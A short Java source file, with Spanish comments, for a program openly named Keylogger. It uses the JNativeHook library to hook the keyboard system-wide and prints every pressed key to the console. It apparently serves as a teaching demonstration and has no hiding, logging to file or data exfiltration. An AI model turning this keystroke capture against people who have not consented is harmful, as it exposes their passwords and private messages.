package keylogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener {

    public static void main(String[] args) {
        //Se inicia la rutina de inicialización de los componentes de la librería JNativeHook
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
        }

        /*Es necesario decirle a la instancia de GlobalScreen que se agregará un Listener,
         * ya que la clase Main implementa la interfaz del Listener sólo se crea una instancia
         * de dicha clase para colocarla como argumento:
         */
        GlobalScreen.getInstance().addNativeKeyListener(new Keylogger());
    }

    //El método que se utilizará por ahora es nativeKeyPressed:
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        //El código que imprimirá en la salida estándar cuál tecla se ha presionado es:
        System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub

    }
}
